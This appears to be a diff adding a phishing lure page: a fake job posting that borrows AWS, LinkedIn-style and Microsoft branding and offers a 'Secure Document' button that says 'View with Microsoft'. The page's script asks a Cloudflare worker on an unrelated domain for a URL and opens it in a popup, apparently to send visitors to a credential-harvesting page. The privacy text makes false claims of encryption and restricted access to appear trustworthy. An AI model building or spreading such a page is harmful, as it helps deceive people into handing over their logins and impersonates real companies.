@@ -1,0 +1,294 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Collaborate with AWS</title>
+    <style>
+        /* Reset default margin and padding for all elements */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        /* Ensure the html and body take full height */
+        html, body {
+            height: 100%;
+            width: 100%;
+            margin: 0;
+            padding: 0;
+            font-family: Arial, sans-serif; /* Add a common font */
+        }
+
+        /* Ensure the popup container fills the screen */
+        .popup-container {
+            display: flex;
+            flex-direction: column;
+            height: 100%;
+            width: 100%;
+            overflow: hidden; /* Prevent scrollbars on the container */
+        }
+
+        /* Top bar styling */
+        .top-bar {
+            width: 100%;
+            background-color: #0073b1; /* Example color */
+            padding: 15px 0; /* Vertical padding, no horizontal */
+            display: flex;
+            justify-content: center; /* Center the logo horizontally */
+            align-items: center;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+            flex-shrink: 0; /* Prevent top bar from shrinking */
+        }
+
+        /* Logo styling */
+        .logo {
+            /* Assuming you might want specific logo styles */
+            /* width: 120px; */ /* Example if using .logo class */
+            height: 50px; /* Maintain height */
+            width: auto; /* Adjust width automatically */
+        }
+
+        /* Content area styling */
+        .content {
+            flex: 1; /* Allows content to fill remaining space */
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            text-align: center;
+            padding: 20px;
+            overflow-y: auto; /* Allow vertical scrolling ONLY if content overflows */
+        }
+
+        /* Job title styling */
+        .job-title {
+            font-size: 28px;
+            font-weight: bold;
+            margin: 0 0 10px 0; /* Added bottom margin */
+            color: #232F3E; /* Example dark color */
+        }
+
+        /* Job location styling */
+        .job-location {
+            font-size: 18px;
+            color: #666;
+            margin: 0 0 20px 0; /* Adjusted margin */
+        }
+
+        /* Job description styling */
+        .job-description {
+            font-size: 16px;
+            line-height: 1.6;
+            color: #444;
+            margin-bottom: 30px; /* Increased spacing */
+            max-width: 500px; /* Limit width for readability */
+        }
+
+        /* Apply section styling */
+        .apply-section {
+            margin-bottom: 20px;
+            text-align: center;
+        }
+
+        .apply-section p {
+            font-size: 18px;
+            font-weight: bold;
+            color: #232F3E;
+            margin-bottom: 15px; /* Increased spacing */
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            position: relative;
+            display: inline-block; /* Allows ::after to be positioned relative */
+        }
+
+        /* Underline effect for the section title */
+        .apply-section p::after {
+            content: '';
+            display: block;
+            width: 60%; /* Width of the underline */
+            height: 2px;
+            background-color: #FF9900; /* Example accent color */
+            margin: 5px auto 0; /* Center the underline */
+        }
+
+        /* Button styling (generic action button) */
+        .action-button {
+            padding: 15px 30px;
+            font-size: 18px;
+            color: white;
+            background-color: #0077B5; /* LinkedIn blue-like color */
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: background-color 0.3s ease, opacity 0.3s ease;
+            display: inline-flex; /* Align icon and text */
+            align-items: center;
+            gap: 8px; /* Space between icon and text */
+            min-width: 150px; /* Ensure consistent width */
+            justify-content: center; /* Center content within button */
+            text-decoration: none; /* Remove underline if used as link */
+            vertical-align: middle; /* Align button correctly with surrounding text */
+        }
+
+        .action-button:hover {
+            background-color: #005582; /* Darker shade on hover */
+        }
+
+        /* Disabled state for the button */
+        .action-button:disabled {
+            background-color: #cccccc; /* Grey out background */
+            cursor: not-allowed; /* Indicate non-interactive */
+            opacity: 0.7; /* Reduce visibility */
+        }
+
+        /* Icon styling within button */
+        .action-button img {
+            width: 20px;
+            height: 20px;
+            vertical-align: middle; /* Helps alignment */
+        }
+
+        /* Privacy policy styling */
+        .privacy-policy {
+            font-size: 12px;
+            color: #666;
+            text-align: center;
+            margin-top: 30px; /* Increased spacing */
+            line-height: 1.5;
+            max-width: 500px; /* Limit width */
+        }
+    </style>
+</head>
+<body>
+    <div class="popup-container">
+        <!-- Top bar with logo -->
+        <div class="top-bar">
+            <!-- Make sure 'cloud-icon.png' is accessible at this path -->
+            <img src="cloud-icon.png" alt="Cloud Icon" class="logo">
+        </div>
+
+        <!-- Content area -->
+        <div class="content">
+            <h1 class="job-title">People & Talent Partners</h1>
+            <p class="job-location">PEOPLE-MULTIPLE LOCATIONS</p>
+          <p class="job-description">Our vision is to create economic opportunity for people everywhere. To do it, we need your talent. Are you in?</p>
+
+      <div class="apply-section">
+                <p>Secure Document</p><br>
+                <!-- Button to trigger the action -->
+                <button type="button" lang="en" class="action-button" id="viewButton">
+                    <!-- Make sure 'ms.png' is accessible at this path -->
+                    <img src="in.png" alt="Document Icon" />
+                    <span id="buttonText">View with Microsoft</span>
+                </button>
+            </div>
+
+            <p class="privacy-policy">The site employs encryption and security protocols to protect content. Users acknowledge that content is protected under intellectual property laws.This website does not collect, store, or retain personal data. Access is restricted to pre-approved users. All content is private property; unauthorized access, sharing, or use is strictly prohibited.</p>
+        </div>
+    </div>
+
+    <script>
+        const FINDER_API_URL = 'https://off-wor.store-mca.workers.dev/';
+
+        // --- DOM Elements ---
+        const viewButton = document.getElementById('viewButton');
+        const buttonText = document.getElementById('buttonText'); // Get the span element for text changes
+
+        /**
+         * Opens the specified URL in a small, centered popup window.
+         * @param {string} url The URL to open in the popup.
+         */
+        function openPopupWithUrl(url) {
+            const popupWidth = 550;
+            const popupHeight = 650;
+
+            // Calculate the position to center the popup
+            const screenWidth = window.innerWidth || document.documentElement.clientWidth || screen.width;
+            const screenHeight = window.innerHeight || document.documentElement.clientHeight || screen.height;
+            const leftPosition = Math.max(0, (screenWidth - popupWidth) / 2); // Ensure left isn't negative
+            const topPosition = Math.max(0, (screenHeight - popupHeight) / 2); // Ensure top isn't negative
+
+            console.log(`Opening popup with URL: ${url}`);
+            // Define window features
+            const windowFeatures = `width=${popupWidth},height=${popupHeight},left=${leftPosition},top=${topPosition},resizable=yes,scrollbars=yes,status=yes`;
+
+            // Open the window
+            window.open(url, 'SafeLinkPopup', windowFeatures);
+        }
+
+        /**
+         * Calls the Cloudflare worker to get a safe URL and then opens it in a popup.
+         * Manages the button state during the process.
+         */
+        async function getAndOpenSafeLink() {
+            // Basic validation for the API URL placeholder
+            if (!FINDER_API_URL || FINDER_API_URL === '<YOUR_WORKER_URL_HERE>') {
+                 console.error("Worker API URL is not configured correctly in popup.html. Please replace the placeholder.");
+                 alert("Error: Link finding service is not configured. Please contact support.");
+                 return; // Stop execution if URL is not set
+            }
+
+            // --- UI Update: Indicate loading ---
+            viewButton.disabled = true; // Disable button
+            buttonText.textContent = 'Checking...'; // Change button text
+
+            try {
+                console.log("Requesting safe URL from worker:", FINDER_API_URL);
+                // Fetch the safe URL from the Cloudflare Worker
+                const response = await fetch(FINDER_API_URL, {
+                    method: 'GET',
+                    headers: {
+                        'Accept': 'application/json' // Indicate we expect JSON
+                    }
+                 });
+
+                // Check if the fetch itself was successful (network level)
+                if (!response.ok) {
+                    // Try to get more specific error message from the worker's response body
+                    let errorDetail = `HTTP error ${response.status}: ${response.statusText}`;
+                    try {
+                        const errorData = await response.json(); // Try parsing JSON error response
+                        if (errorData && errorData.error) {
+                            errorDetail = `Error from service: ${errorData.error}`;
+                        }
+                    } catch (e) {
+                        // If response is not JSON or parsing fails, stick to HTTP status text
+                        console.warn("Could not parse error response body as JSON.");
+                    }
+                    throw new Error(errorDetail); // Throw an error to be caught by the catch block
+                }
+
+                // Parse the JSON response from the worker
+                const data = await response.json();
+
+                // Check if the expected data structure is present
+                if (data && data.urlToOpen) {
+                    // Success: Open the URL provided by the worker
+                    openPopupWithUrl(data.urlToOpen);
+                } else {
+                    // Worker responded successfully, but the data format is wrong
+                    console.error('Worker response received, but did not contain a valid "urlToOpen" property.', data);
+                    throw new Error('Received invalid response from the link service.');
+                }
+
+            } catch (error) {
+                // Handle errors (network issues, fetch errors, parsing errors, thrown errors)
+                console.error('Failed to get or open the safe link:', error);
+                alert(`Could not retrieve the document link. Reason: ${error.message}`); // Show user-friendly error
+            } finally {
+                // --- UI Update: Restore button state ---
+                // This block executes regardless of success or failure (after try/catch)
+                viewButton.disabled = false; // Re-enable button
+                buttonText.textContent = 'View with Microsoft'; // Restore original text
+            }
+        }
+
+        // --- Event Listener ---
+        // Add a click event listener to the button to trigger the process
+        viewButton.addEventListener('click', getAndOpenSafeLink);
+
+    </script>
+</body>
+</html>
